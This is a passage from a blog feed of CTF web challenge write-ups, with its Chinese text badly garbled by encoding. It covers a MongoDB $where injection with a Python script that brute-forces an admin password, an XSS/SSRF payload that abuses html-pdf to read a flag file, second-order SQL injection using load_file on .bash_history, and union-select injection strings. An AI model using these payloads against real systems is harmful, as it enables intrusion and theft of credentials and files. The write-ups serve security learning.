idï¼Œåœ¨vpsä¸Šå¼€æœåŠ¡<code>python3 -m http.server 80</code>ç›‘å¬å³å¯ã€‚</p><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>è¿™é‡Œå…¶å®åœ¨authæ“ä½œæ—¶å­˜åœ¨æ³¨å…¥ï¼Œæ¢ä¸ªæ€è·¯æƒ³ï¼Œflagåœ¨adminç”¨æˆ·çš„æ–‡ç« ä¸‹ï¼Œé‚£å°†adminçš„å¯†ç æ³¨å…¥å‡ºæ¥ä¸å°±è¡Œäº†ã€‚</p><figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">let</span> docs = <span class="hljs-keyword">await</span> User.$where(<span class="hljs-string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="hljs-subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()<br></code></pre></div></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>url = <span class="hljs-string">&#x27;http://6d7f5839-9b17-40fe-b5de-b04cfdae1037.node4.buuoj.cn:81/auth&#x27;</span><br>s = requests.session()<br>password = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">130</span>):<br>        cookies = &#123;<span class="hljs-string">&#x27;session&#x27;</span>:<span class="hljs-string">&#x27;s%3A9fJutdIDuXFuT3gcoAor1vkFD9Ikv2Tc.f3ROtzd9M%2Fzu%2BsRjUa60NMseu56cqBbZ5rqQEyk3Ghc&#x27;</span>&#125;<br>        data = &#123;<span class="hljs-string">&#x27;_csrf&#x27;</span>:<span class="hljs-string">&#x27;1zvGp4cd-G4wtUGigLyKgRmKIy-BWtBkFGH0&#x27;</span>,<br>                <span class="hljs-string">&#x27;token&#x27;</span>:<span class="hljs-string">&quot;cf87efe0c36a12aec113cd7982043573\&quot;||(this.username==\&quot;admin\&quot;&amp;&amp;this.password[&#123;&#125;]==\&quot;&#123;&#125;\&quot;)||\&quot;&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(j))&#125;<br>                <span class="hljs-comment"># &#x27;token&#x27;:&#x27;&quot;+hex_md5(this.password)&amp;&amp;this.password[&#123;&#125;]==&quot;&#123;&#125;&quot;&amp;&amp;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;==&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;.format(i,chr(j))&#125;</span><br>        res = s.post(url,data=data,cookies=cookies)<br><br>        <span class="hljs-comment"># print(res.text)</span><br>        <span class="hljs-comment"># print(&#x27;------------------&#x27;)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Found. Redirecting to&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            password +=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;---------&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><br></code></pre></div></td></tr></table></figure><p>ç¬¬äºŒç§payloadæ˜¯ç›´æ¥åˆ©ç”¨jsçš„æŠ¥é”™ï¼Œå› ä¸ºMongoDBæ”¯æŒJavascriptè¯­æ³•ã€‚æ‰€ä»¥å¯ä»¥ç”¨jsè¯­æ³•å»æŠ›å‡ºå†…å®¹æ˜¯adminå¯†ç çš„å¼‚å¸¸</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">_csrf=2PzwJX5n-Y1qH02TLkz3_JXa_OBn2hpgU2G8&amp;token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span class="hljs-string">&quot;||</span><br><span class="hljs-string">(()=&gt;&#123;throw Error(this.password)&#125;)()==&quot;</span>admin<br>#MongoError: Executor error during find command :: caused by :: Error: !@#&amp;@&amp;@efefef*@((@))grgregret3r : @:1:125 @:1:112<br></code></pre></div></td></tr></table></figure><h1 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h1><p>å®¡è®¡æºç ï¼Œå‘ç°ä¸€äº›ç‚¹</p><p><img src="https://img-blog.csdnimg.cn/f3aed98be9b64148a68d836e79a5fe3b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œçš„<code>content</code>è€ƒè™‘xssï¼Œä¸Šé¢å­˜åœ¨è¿‡æ»¤ï¼Œä½†å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯ä¸‹é¢æ˜¯é€šè¿‡<code>superuser</code>åˆ›å»ºçš„æ•°æ®åº“ï¼Œæ— æ³•ç”¨<code>/api/files/:id</code>è®¿é—®</p><p><img src="https://img-blog.csdnimg.cn/0cfee0eda2cd4c7b836a5e5970a5b21c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é€šè¿‡æŸ¥æ‰¾<code>html-pdf</code>åº“å‘ç°å®ƒå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼š</p><blockquote><p>html-pdf before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as request.open(â€œGETâ€,â€file:///etc/passwdâ€) will result in a PDF document with the contents of /etc/passwd.</p></blockquote><p>æ¥ç€å¾€ä¸‹çœ‹ï¼Œæœ‰ä¸€ä¸ªæç¤ºï¼Œè¿™é‡Œé™åˆ¶äº†éœ€è¦æœ¬åœ°æ‰èƒ½è®¿é—®ï¼Œåº”è¯¥æ˜¯xssæ‰“ssrfï¼Œç„¶åè¿›è¡Œ<code>create</code>æ“ä½œ,ç»“åˆæ–‡æ¡£å¯ä»¥ç”¨xhræ“ä½œ</p><p><img src="https://img-blog.csdnimg.cn/a4f8ca711a514b5b9cb41e60cdfd6900.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€åè¿™é‡Œæ˜æ˜¾å¯ä»¥çœ‹åˆ°å­˜åœ¨æ–‡ä»¶è¯»å–ã€‚</p><p><img src="https://img-blog.csdnimg.cn/c627162578714046893c6287b5fa1f08.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œæ‰“ssrfçš„æ“ä½œä½¿ç”¨xhræ¥æ‰“ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œcontentçš„å†…å®¹ä¸€å®šè¦urlç¼–ç ï¼Œè¢«å‘äº†å¾ˆä¹…ã€‚æœ€åè®¿é—®<code>/api/files/1234</code>å³å¯</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">content[]=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="javascript">xhr.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/xhtml+xml&quot;</span>);</span><br><span class="javascript">xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=/flag&amp;checksum=1234&quot;</span>, <span class="hljs-literal">true</span>);</span><br>    xhr.send();<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="cralwer-z"><a href="#cralwer-z" class="headerlink" title="cralwer_z"></a>cralwer_z</h1><p>åœ¨<code>/profile</code>ä¸­ï¼Œæ›´æ–°äº†<code>personalbucket</code>å¹¶ä¸”å°†validè®¾ç½®æˆäº†falseã€‚</p><p><img src="https://img-blog.csdnimg.cn/f0589ea4a2834814a83229c106e32c99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿›è¡Œäº†ä¸€ä¸ªåŒ¹é…ï¼Œç¬¦åˆåˆ™è·³è½¬ï¼Œè¿™é‡Œå¥½ç»•è¿‡ç›´æ¥?a=.oss-cn-beijing.ichunqiu.comå°±è¡Œ</p><p><img src="https://img-blog.csdnimg.cn/1492f0846ecd4d0390a9ff603cb71246.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>verifyä¸­å°†bucketæ›´æ–°ä¸ºpersonalbucketï¼Œä½†æ˜¯å‰ææ˜¯validè¦ä¸ºtrueã€‚</p><p><img src="https://img-blog.csdnimg.cn/9bd7266f7c354e048d7739db42aa8c7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€ååœ¨bucketä¸­è®¿é—®äº†è®¾ç½®çš„bucketï¼Œè¿™é‡Œçš„çˆ¬è™«ä½¿ç”¨äº†zombieåº“ï¼Œè¿™ä¸ªåº“å­˜åœ¨rceæ¼æ´ï¼Œæœç´¢å¼•æ“çœŸçš„å¾ˆé‡è¦</p><p>å‚è€ƒ<a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a></p><p><img src="https://img-blog.csdnimg.cn/47ff8e3d81bd48438119da3ab0c4785d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ€è·¯å¾ˆæ˜æ˜¾äº†ï¼Œå…ˆåœ¨profileä¸­éšä¾¿ä¼ ä¸€ä¸ªæŠ“åŒ…è·å–tokenï¼Œç„¶åå°†bucketè®¾ç½®æˆè‡ªå·±çš„urlï¼Œç„¶åæäº¤å°†personalbucketæ›´æ–°ï¼Œç„¶åæ‹¿æœ€å¼€å§‹è·å–çš„tokenè®¿é—®verifyæ¥å®ç°æ›´æ–°ï¼Œæœ€åè®¿é—®bucketç•Œé¢æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œbuuä¸Šåå¼¹ä¸äº†shellä¸çŸ¥é“ä¸ºå•¥ã€‚</p><p><img src="https://img-blog.csdnimg.cn/5b52a4587fbc4b67ac9a29ad485c54be.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åšå‡ é“ç½‘é¼æ¯</title>
    <link href="/2021/08/18/2021-8-16-%E5%81%9A%E5%87%A0%E9%81%93%E9%A2%98/"/>
    <url>/2021/08/18/2021-8-16-%E5%81%9A%E5%87%A0%E9%81%93%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h1><p>æ‰“å¼€ç•Œé¢ï¼Œè·Ÿç€æäº¤å¸–å­å‘ç°è¦ç™»é™†ï¼Œç™»é™†ç•Œé¢æœ€å¼€å§‹ä»¥ä¸ºæ˜¯ç›´æ¥æ³¨å…¥å‘¢ï¼Œåæ¥æ‰æ³¨æ„åˆ°æœ‰æç¤º<code>***</code>è¦çˆ†ç ´ï¼Œçˆ†ç ´å‡ºæ¥æ—¶666ï¼Œç™»é™†åæ­£å¸¸æäº¤å¸–å­ï¼Œç„¶åå¥½åƒå°±æ²¡å•¥äº†ï¼Œæƒ³èµ·æ¥æ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ‰«åˆ°äº†gitæ–‡ä»¶æ³„éœ²ï¼Œç›´æ¥githackä¸‹è½½ä¸‹æ¥ï¼Œgitæ¢å¤äº†ä¸€ä¸‹æ‹¿åˆ°æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br>session_start();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = mysql_num_rows(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>æ¯”è¾ƒæ˜æ˜¾çš„äºŒæ¬¡æ³¨å…¥ï¼Œåœ¨<code>write</code>æ“ä½œä¸­å°†æ¶æ„<code>category</code>å†™å…¥æ•°æ®åº“ï¼Œå…¶å®é‚£ä¸ªè½¬ä¹‰å‡½æ•°æ²¡ä»€ä¹ˆç”¨ï¼Œå› ä¸ºå­˜å…¥æ•°æ®åº“çš„è¿˜æ˜¯åŸæ•°æ®ï¼Œåæ¥åœ¨<code>comment</code>ä¸­ç›´æ¥è°ƒç”¨äº†<code>category</code>ï¼Œé€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p><p>æœ€å¼€å§‹è¯•äº†æ­£å¸¸çš„è¯»å–æ•°æ®åº“ä½†æ˜¯æ²¡å‘ç°å›æ˜¾ï¼Œåæ¥è¯»äº†ä¸‹user()å‘ç°æ˜¯rootæƒé™ï¼Œé‚£flagåº”è¯¥ä¸åœ¨æ•°æ®åº“ï¼Œæœ€åå‘ç°å¯ä»¥ç”¨<code>load_file</code></p><p>æ¥è¯»bashå‘½ä»¤è®°å½•ã€‚è¿™ä¸ªåœ°æ–¹èƒ½è¯»å–ä¹Ÿæ˜¯å»ºç«‹åœ¨å¯è¯»æƒé™ä¸Šçš„</p><p>å…ˆå†™ä¸ªå¸–å­ä½¿<code>category = 1&#39;,content=(select load_file(&#39;/home/www/.bash_history&#39;)),/*</code>ç„¶åç•™è¨€å‡º<code>*/#</code>é—­åˆå°±å¯ä»¥ï¼Œ</p><p><img src="https://img-blog.csdnimg.cn/d6ff82be96b8453db7fd742e3f4f5587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†è¯»<code>.DS_Store</code> ï¼Œä½†éœ€è¦hexç¼–ç ä¸€ä¸‹ï¼Œå› ä¸ºæœ‰ä¸å¯è§å­—ç¬¦ï¼Œæ¥ç€è¯»<code>flag_8946e1ff1ee3e40f.php</code>æ‹¿flag</p><h1 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h1><p>è¿›å…¥é¡µé¢å‘ç°å°è¯•joinï¼ŒæŒ‰è¦æ±‚è¾“å…¥äº†ï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªç”¨æˆ·çš„æ ·å­ï¼Œçœ‹äº†ä¸‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸ªé“¾æ¥<code>view.php?no=1</code>ï¼Œæ„Ÿè§‰æ˜¯æ³¨å…¥çš„æ ·å­ï¼Œç‚¹å¼€æ­£å¸¸ç•Œé¢ï¼Œè¯•äº†ä¸‹no=2æŠ¥é”™äº†ï¼Œæ¥ç€ç®€å•æµ‹è¯•äº†ä¸‹ï¼Œç”¨<code>union select</code>æ—¶è¿”å›äº†<code>no hack ~_~</code>ï¼Œè¢«banäº†ï¼è¿™é‡Œåº”è¯¥å°±å¯ä»¥ç¡®å®šå­˜åœ¨æ³¨å…¥äº†ï¼Œè¯•äº†ä¸‹å†…æ•›æ³¨é‡Šå¯ä»¥ç»•è¿‡ã€‚æµ‹è¯•äº†ä¸‹æœ‰å››ä¸ªå­—æ®µ<code>no=-1%20union/**/select%201,2,3,4#</code>ï¼Œå‘ç°<code>username</code>å¤„å›æ˜¾äº†2ï¼Œæ¥ç€å°±å¯ä»¥æ¥å¾—åˆ°è¡¨å­—æ®µå•¥çš„äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(database()),3,4%20limit%200,1#     <br>å›æ˜¾fakebook<br><br>no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20limit%200,1#              <br>å›æ˜¾users<br><br><br>no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20limit%200,1#     <br>å›æ˜¾no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONSã€<br><br>no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(no,username,passwd,data),3,4%20from%20users%20limit%200,1#<br>å›æ˜¾1kkfineba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;kkfine&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:25:&quot;https:&#x2F;&#x2F;haoami.github.io&#x2F;&quot;;&#125;<br><br>no:1<br>username:kkfine<br>passwd:ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413<br>data:O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;kkfine&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:25:&quot;https:&#x2F;&#x2F;haoami.github.io&#x2F;&quot;;&#125;<br></code></pre></div></td></tr></table></figure><p>å†çœ‹åˆ°è¿™ä¸ªåºåˆ—åŒ–æ•°æ®çŒœåˆ°å’Œååºåˆ—åŒ–æœ‰å…³ï¼Œåˆ°è¿™å¡äº†ä¸€ä¸‹ä¸çŸ¥é“å¹²å•¥äº†ï¼Œç„¶åæƒ³èµ·æ¥ç›®å½•è¿˜æ²¡æ‰«ï¼Œå‘ç°æœ‰robots.txtä¸­æœ‰ç»™å‡ºäº†bakæ–‡ä»¶ï¼Œæ‹¿åˆ°æºç åˆ†æï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br><br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span 